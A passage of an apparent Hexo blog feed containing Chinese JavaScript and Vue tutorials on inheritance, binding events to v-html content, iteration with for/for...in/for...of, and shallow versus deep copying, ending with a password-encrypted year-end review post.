class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;zzj&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> sub2 = <span class="keyword">new</span> <span class="title class_">Sub</span>(<span class="string">&#x27;sjj&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sub1.<span class="title function_">sayName</span>() <span class="comment">// zzj</span></span><br><span class="line">sub2.<span class="title function_">sayName</span>()  <span class="comment">// sjj</span></span><br><span class="line"><span class="comment">// 在 sub1里push c</span></span><br><span class="line">sub1.<span class="property">supArr</span>.<span class="title function_">push</span>(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">// console.log(sub1)</span></span><br><span class="line"><span class="comment">// console.log(sub2)</span></span><br><span class="line"><span class="comment">// sub2里的arr不会受到影响</span></span><br><span class="line">sub1.<span class="title function_">sayArr</span>()</span><br><span class="line">sub2.<span class="title function_">sayArr</span>() <span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27; ]</span></span><br></pre></td></tr></table></figure><p>优点： 完美<br>缺点： 踩的坑有点多， 1.在Object函数中 应该是将父类原型赋值给 中间函数，而不是父类构造函数， 2. 定义子类原型方法应该在寄生组合操作之后</p><p>掌握到这些，那js的继承应该就差不多了，不过现在我更喜欢ES6的class中extend继承，但是这些理解了，有木有感觉自己又变强了^_^</p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v-html中的dom绑定事件</title>
      <link href="/2020/05/10/v-html%E4%B8%AD%E7%9A%84%E7%BB%91%E5%AE%9A%E4%BA%8B%E4%BB%B6/"/>
      <url>/2020/05/10/v-html%E4%B8%AD%E7%9A%84%E7%BB%91%E5%AE%9A%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>后台返回数据为HTML，通过v-html渲染页面后，jquery为数据里的Dom添加事件</p><h4 id="后台数据与渲染"><a href="#后台数据与渲染" class="headerlink" title="后台数据与渲染"></a>后台数据与渲染</h4><p>这是后台返回的数据 <img src="https://cdn.jsdelivr.net/gh/bitjian/blogImg/2020/05/data.png" alt="后台返回的数据"><br>这是通过v-html渲染到页面 <img src="https://cdn.jsdelivr.net/gh/bitjian/blogImg/2020/05/html.png" alt="渲染到页面"></p><h4 id="添加点击事件失败"><a href="#添加点击事件失败" class="headerlink" title="添加点击事件失败"></a>添加点击事件失败</h4><p>在vue声明周期mounted添加事件,并没有添加到，甚至连dom都没有获取到</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&#x27;.app-link&#x27;</span>))</span><br><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;.app-link&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">      event.<span class="title function_">preventDefault</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1111111111&#x27;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><span id="more"></span><p>在mounted里使用 setTimeout也没有用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      $(<span class="string">&#x27;.app-link&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">      event.<span class="title function_">preventDefault</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1111111111&#x27;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>通过一番倒腾，最终在updated里添加事件成功</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">updated</span>(<span class="params"></span>) &#123;</span><br><span class="line">      $(<span class="string">&#x27;.app-link&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">      event.<span class="title function_">preventDefault</span>();</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;1111111111&#x27;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>最好在beforeUpdate里清空要添加dom的点击事件，不然每次执行updated，都会在click事件里添加一个function</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;.app-link&#x27;</span>).<span class="title function_">off</span>();</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于for的一系列</title>
      <link href="/2020/04/24/%E5%85%B3%E4%BA%8Efor%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97/"/>
      <url>/2020/04/24/%E5%85%B3%E4%BA%8Efor%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h4 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h4><h5 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h5><p>遍历数组常用for循环 ES5遍历数组的方法有forEach,map,filter,some，every,reduce等<br> 使用forEach不能使用break和return跳出循环</p><p>es5的forEach方法其实性能比for循环还要弱，使用for循环可以将长度用遍历存起来，可以优化性能</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">length</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> myArray = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>];</span><br><span class="line">myArray.<span class="property">name</span> = <span class="string">&quot;数组&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>,len = myArray.<span class="property">length</span>; j &lt; len; j++)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(myArray[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="for…in"><a href="#for…in" class="headerlink" title="for…in"></a>for…in</h5><p>使用for in 遍历数组的毛病</p><p>1.index是字符串<br>2.遍历顺序可能不是数组的内部顺序<br>3.会遍历数组的可枚举对象包括原型，例如上面的method和name<br>所以for in 不适合遍历数组</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> index <span class="keyword">in</span> myArray) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(index,myArray[index])</span><br><span class="line"><span class="comment">//   0 a</span></span><br><span class="line"><span class="comment">//   1 b</span></span><br><span class="line"><span class="comment">//   2 c</span></span><br><span class="line"><span class="comment">//   3 d</span></span><br><span class="line"><span class="comment">//   name 数组</span></span><br><span class="line"><span class="comment">//   method function() &#123;</span></span><br><span class="line"><span class="comment">//   console.log(this.length)</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="for…of"><a href="#for…of" class="headerlink" title="for…of"></a>for…of</h5><p>使用for of 遍历的是数组的值而 for in 遍历的是数组的键名<br>for of遍历只会遍历数组自身的值，而不会去遍历原型和其他属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> val <span class="keyword">of</span> myArray) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h4><h5 id="1-使用for-in遍历对象"><a href="#1-使用for-in遍历对象" class="headerlink" title="1.使用for in遍历对象"></a>1.使用for in遍历对象</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">method</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> myObj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="string">&quot;apple&quot;</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="string">&quot;banane&quot;</span>,</span><br><span class="line">  <span class="attr">c</span>: <span class="string">&quot;cherry&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> myObj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(i,myObj[i])</span><br><span class="line"><span class="comment">// 会遍历到原型上的方法和属性</span></span><br><span class="line"><span class="comment">//   a apple</span></span><br><span class="line"><span class="comment">//   b banane</span></span><br><span class="line"><span class="comment">//   c cherry</span></span><br><span class="line"><span class="comment">//   method function() &#123;</span></span><br><span class="line"><span class="comment">//     console.log(this)</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不想遍历原型上的方法和属性可以使用hasOwnPropery<br>hasOwnPropery可以判断某属性是否是对象的实例属性，从而过滤掉原型上的属性</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i <span class="keyword">in</span> myObj) &#123;</span><br><span class="line">  <span class="keyword">if</span>(myObj.<span class="title function_">hasOwnProperty</span>(i)) &#123;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(i, myObj[i])</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 只获取自身属性</span></span><br><span class="line"><span class="comment">//   a apple</span></span><br><span class="line"><span class="comment">//   b banane</span></span><br><span class="line"><span class="comment">//   c cherry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="for…of-1"><a href="#for…of-1" class="headerlink" title="for…of"></a>for…of</h5><p>也可以使用for of 搭配Object.keys 来遍历对象 返回一个数组,包括对象自身的(不含继承的)所有可枚举属性(不含Symbol属性).<br>相关的Object属性还有<br>Object.getOwnPropertyNames(obj) 返回一个数组,包含对象自身的所有属性(不含Symbol属性,但是包括不可枚举属性).<br>使用Reflect.ownKeys(obj)遍历 返回一个数组,包含对象自身的所有属性,不管属性名是Symbol或字符串,也不管是否可枚举.  </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(myObj)) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, myObj[key])</span><br><span class="line">  <span class="comment">// 不包含原型属性</span></span><br><span class="line"><span class="comment">//   a apple</span></span><br><span class="line"><span class="comment">//   b banane</span></span><br><span class="line"><span class="comment">//   c cherry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果实在想用 for of遍历对象，可以给该对象添加Symbol.iterator迭代器接口<br>接口自己实现<br>for of循环会先调用集合的Symbol.iterator方法，然后返回一个新的迭代器对象，<br>迭代器对象可以是任意具有next方法的对象，迭代器对象会重复调用这个方法<br>每循环一次调用一次<br>迭代器对象可以是任意具有next方法的对象，迭代器对象会重复调用这个方法var<br>使用Genertaor 自带next()</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">myObj[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] = <span class="keyword">function</span>* () &#123;</span><br><span class="line">  <span class="keyword">yield</span> <span class="variable language_">this</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="variable language_">this</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">yield</span> <span class="variable language_">this</span>.<span class="property">c</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 实现一个简单的迭代器</span></span><br><span class="line">myObj[<span class="title class_">Symbol</span>.<span class="property">iterator</span>] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(self);</span><br><span class="line">  <span class="keyword">const</span> len = keys.<span class="property">length</span>;</span><br><span class="line">  <span class="keyword">let</span> pointer = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line"> <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> done = pointer &gt;= len;</span><br><span class="line">   <span class="keyword">const</span> value = !done ? self[keys[pointer++]]: <span class="literal">undefined</span>;</span><br><span class="line">   <span class="keyword">return</span> &#123;</span><br><span class="line">     done,</span><br><span class="line">     value</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> item <span class="keyword">of</span> myObj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用for of 遍历Map对象 顺便回顾一下Map对象的基本使用</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myMap = <span class="keyword">new</span> <span class="title class_">Map</span>([</span><br><span class="line">  [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;apple&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;b&quot;</span>, <span class="string">&quot;banane&quot;</span>],</span><br><span class="line">  [<span class="string">&quot;c&quot;</span>, <span class="string">&quot;cherry&quot;</span>],</span><br><span class="line">]);</span><br><span class="line"><span class="comment">// 给Map对象添加属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(myMap.<span class="title function_">set</span>(<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;durian&#x27;</span>)) <span class="comment">// 返回是添加之后的Map</span></span><br><span class="line"><span class="comment">// 判断key是否存在 返回值 是否存在</span></span><br><span class="line">myMap.<span class="title function_">has</span>(<span class="string">&#x27;a&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;myMap.has(\&#x27;a\&#x27;): &#x27;</span>, myMap.<span class="title function_">has</span>(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="comment">// myMap.delete(&#x27;a&#x27;) // 删除属性 返回值 是否删除成功</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;myMap.delete(\&#x27;a\&#x27;): &#x27;</span>, myMap.<span class="title function_">delete</span>(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"><span class="comment">// myMap.get(&#x27;d&#x27;) // 获取属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;myMap.get(\&#x27;d\&#x27;) : &#x27;</span>, myMap.<span class="title function_">get</span>(<span class="string">&#x27;d&#x27;</span>) );</span><br><span class="line">使用数组结构 <span class="title class_">Map</span>的item</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> [key, val] <span class="keyword">of</span> myMap) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key, val)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>for of 使用于遍历数组&#x2F;数组对象[{},{}]&#x2F;字符串&#x2F;map&#x2F;set等有迭代器对象的集合<br>但不能遍历对象，应为对象没有迭代器对象,它可以正确的相应break、continue、return语句<br>es5的forEach方法其实性能比for循环还要弱，使用for循环可以将长度用遍历存起来，可以优化性能</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/zjx304/p/10687017.html">for in 和for of的区别</a><br><a href="https://blog.csdn.net/kuangshp128/article/details/85342343">ES6可迭代对象与迭代器的理解</a></p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅拷贝与深拷贝</title>
      <link href="/2020/04/22/%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"/>
      <url>/2020/04/22/%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/</url>
      
        <content type="html"><![CDATA[<h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><h4 id="使用Object-assign将原对象的值分配给一个新对象"><a href="#使用Object-assign将原对象的值分配给一个新对象" class="headerlink" title="使用Object.assign将原对象的值分配给一个新对象"></a>使用Object.assign将原对象的值分配给一个新对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span></span><br><span class="line"><span class="attr">age</span>: <span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 要在Object.assign 重新定义一个&#123;&#125; 然后将obj复制到&#123;&#125;</span></span><br><span class="line"><span class="keyword">let</span> objCp = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;,obj)</span><br><span class="line"><span class="comment">// 修改objCp 的属性 不会影响原来的对象</span></span><br><span class="line">objCp.<span class="property">age</span> = <span class="string">&#x27;23&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objCp, obj) <span class="comment">// &#123; name: &#x27;zzj&#x27;, age: &#x27;23&#x27; &#125; &#123; name: &#x27;zzj&#x27;, age: &#x27;22&#x27; &#125;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="使用ES6的扩展运算符"><a href="#使用ES6的扩展运算符" class="headerlink" title="使用ES6的扩展运算符"></a>使用ES6的扩展运算符</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="string">&#x27;22&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> objCp = &#123;...obj&#125;</span><br><span class="line">objCp.<span class="property">age</span> = <span class="string">&#x27;23&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objCp, obj) <span class="comment">// 效果同上</span></span><br></pre></td></tr></table></figure><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><h5 id="使用使用Json-parse-Json-stringfy-缺点：不能拷贝源对象中-undefined-值和-方法"><a href="#使用使用Json-parse-Json-stringfy-缺点：不能拷贝源对象中-undefined-值和-方法" class="headerlink" title="使用使用Json.parse(Json.stringfy()) 缺点：不能拷贝源对象中 undefined 值和 方法"></a>使用使用Json.parse(Json.stringfy()) 缺点：不能拷贝源对象中 undefined 值和 方法</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">22</span>,</span><br><span class="line">  <span class="attr">girlFriend</span>: <span class="literal">undefined</span>,</span><br><span class="line">  <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不能拷贝方法 和 undefined</span></span><br><span class="line"><span class="keyword">let</span> objCp = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj))</span><br><span class="line">objCp.<span class="property">name</span> = <span class="string">&#x27;sjj&#x27;</span></span><br><span class="line">objCp.<span class="property">age</span> = <span class="number">23</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objCp, obj)</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;sjj&#x27;</span>, <span class="attr">age</span>: <span class="number">23</span> &#125; &#123; <span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">22</span>,</span><br><span class="line">  <span class="attr">girlFriend</span>: <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">getName</span>: [<span class="title class_">Function</span>: getName] &#125;</span><br></pre></td></tr></table></figure><h5 id="编写一个深拷贝函数"><a href="#编写一个深拷贝函数" class="headerlink" title="编写一个深拷贝函数"></a>编写一个深拷贝函数</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 编写一个函数</span></span><br><span class="line"><span class="comment">// 1. 判断传入的值是否是 对象 如果是进行拷贝，否则直接返回</span></span><br><span class="line"><span class="comment">// 2. 判断传入的值 是对象还是数组 给该值初始化&#123;&#125;或者[]</span></span><br><span class="line"><span class="comment">// 3.进行递归</span></span><br><span class="line"><span class="comment">// 深拷贝函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deepCp</span>(<span class="params">data</span>) &#123;</span><br><span class="line"> <span class="comment">// 判断是不是&#123;&#125;或者Array</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> data === <span class="string">&#x27;object&#x27;</span> &amp;&amp; data) &#123;</span><br><span class="line">    <span class="comment">// 判断该值是对象还是数组</span></span><br><span class="line">    <span class="keyword">let</span> val = <span class="keyword">typeof</span> data.<span class="property">length</span> === <span class="string">&#x27;number&#x27;</span> ? [] : &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> item <span class="keyword">in</span> data) &#123;</span><br><span class="line">      <span class="comment">// 进行递归，对子项进行判断</span></span><br><span class="line">      val[item] = <span class="title function_">deepCp</span>(data[item])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">22</span>,</span><br><span class="line">  <span class="attr">girlFriend</span>: <span class="literal">undefined</span>,</span><br><span class="line">  <span class="title function_">getName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">name</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> objCp = <span class="title function_">deepCp</span>(obj)</span><br><span class="line">objCp.<span class="property">name</span> = <span class="string">&#x27;sjj&#x27;</span></span><br><span class="line">objCp.<span class="property">age</span> = <span class="number">23</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objCp, obj)</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line">&#123; <span class="attr">name</span>: <span class="string">&#x27;sjj&#x27;</span>, <span class="attr">age</span>: <span class="number">23</span> &#125; &#123; <span class="attr">name</span>: <span class="string">&#x27;zzj&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">22</span>,</span><br><span class="line">  <span class="attr">girlFriend</span>: <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">getName</span>: [<span class="title class_">Function</span>: getName] &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019回顾</title>
      <link href="/2019/12/29/2019%E5%B9%B4%E6%9C%AB/"/>
      <url>/2019/12/29/2019%E5%B9%B4%E6%9C%AB/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="3888b68efd3616a1ddf46939fc54d4f673fdc23b0671b747a78ab7e189cfad71">305a832858cf8cef14f9d85cee8e5b9d3fe10307103af5ee275a8dd34365887ac622e8adf4ecd33650182a9c1e04f5a0acaeaf8bc0979aa8190f9abedcff3d47216e893613386a547ccf7b792fdae105ec00966040c2ccca50f09891d886d3b2635faf2fe6a40d1680af5a102d1a07c3f98328413fd28476f616ccf71cab2619fd13a0c9688605ba8bc1db6935a25678a93a834cbe5fe4295597af8ecaeddee50a2ac8f14ebef46ad1ac82ca5a182e9291de693ce66b64db9f84646ba54b6f482c6d1998cb5888a94b7c7f70e1e37a19514482eb001ac94b7e1d964cc7732c1e6ae677a6554225cf912382acd6af40916b8c462da928f41e1b32691d92bc12fbda1bf9771cf1eb2e86f115a5308fce28c9fbb9d514fef113178a43c8a2835c45046062f4f187405c223431765044840b2d3ed64b25524e13f8e39028d73a6814ecfdacb7309dee83da23f58c75e53df2cafe1657a35a0c67c3b5f1c6533c72955eb0baaf0e536116146b3cc1dff05d1a8a865278516bec48972c00df5c53bd6a7aaef71d9edf5e89659986ab2f6f1debfa3c886989a05fc42ed14f10ff709aedb15d7e4df95985a186e8ba79171bb90ecadb5758f01ffccbcc6702f828961b763385e552025ccc2946457126a825b2807be6a21c25b06f4ec63fe022c9aaaf899dbb33adbe162f14af0819e4272709af3f779732a7b8a5cad2cd370e4458971e77f7d1edab1f7f0b891e685f281077ae857b88a0cb51dde8308b19548264f8e96b680eb992f6536f278b6b6d909f8f176132273227eb4834ee13b3a63c1d891bf1d9bc16e61e95233f0045e0866f8f5285033afa06a197f72fa980c8d54b5ad39b1867eb8215d8b3f28d806baee0a1b91f9e8eaf920d9d37ff26bcc4f78bafed2420d6932f301b4f96d4d232092ef1a28381493693d11fa4c866fb88139cc05cefb97ffaf4e64cf2110defb2ab6ff3a0cfb51a4d51c88a4beb868f18726a836aec2871925be27af5138b37a4864fab5b96987516b6f05eaacfd224c24fb672c3c96e6d2f528d9e6dca4a0c26104b8896ebc1ef63278e6d64b7ab326dd8b2bab8fe07cf1d0313ed27061f2e0aa52cdabc4b616b3a75b9bec484d5fcf1a1b646295423779c1e821af152c0245c6613b69df5a390fda0225b994971eef1d77b63b9e1d0b91bca3b39b9384418bcb78147189db9b036ca3c79525c307d1ca4f059b4847b04520356789c11b3e83cd54e0b876710450ec00954cc7db0f25f6d72f7f017b8590a603040560e89504abd2851cc5a0b1a64b890249f3e35651f38cb7efa6ad2ab29b11cf08704c4fd66a7ed49852892abf0da5fa0fc1e3036c93fa092eba888bfca51bcc4259011ce002f2745f3b89b193abcd338bc4f63632589352fcd428ddf43f7a8d6960f1f028cde85dcf4444c6ab8cac20d0b6fdc919cb6249f6834ac71942657ebf708f54ae86a9f911ad3ff3331662a753a68eed0cce0a61369840c5e4b127302519d7157ffb403b4f0e218111acd72ac24e4ceab73b86307b499f129ac5b18c393dc8d41b614045529a539668290eba434cc1bae189dcd46ad149b4f45c2551af26dfe30c1c8bc0ffe2cb2a5a3c722f5a55b0f21298b12f15b10341227f8dd3a7988be2182a18b7b8ee14499f9ee1873644c89ee08fd1f7da13973f1f2eacfa180c2f833c7747559affc0930410f356b89e491dfbdc893b58511747adeb02b3d39b6c176d2867ba4c172e90855d41b4cce90f543cf83f0946b016ced7ac04afd46d4edb3c4942e24d02bdf3e9a3310a070a1daa00d4fdf1ef7788ba9ff7696f93d36e782f366f5966644bf66427fb94bc0527753bba163089aaaef894191518c35404b1ac75d8bc38433ff2bb877d8ec6e757082aa6577dbe065344552aee2eee75936cff8563ba8b15a6f3e48af902ef1ff6d39a337df26af76ee82eb6d47489a0ab3fc563316db5fcd7adde60662e5918ecdc5c8229241a44e2530015e88e37ebad126e3b202ddc0770d1ce9065f708a431b30b0cc54ebf082a55e8b6271ff16908dfb60e6db9b022cc51815a3969210cdd91823cae252f85e9490e33a272e85f0c9fd20f6f7317d4e535f70bf67f07b1f2e504d9aaadda28cd7174ae75fabe6cdf50071c01ed12d922fa2ceba9bec12bbfb23a0b6ad2a9b69d31a8e22ff6f14e9f711e61df074bfc498811105d68b679288fc9b6fbed8a559ac50ae8da8b6990dd762a689b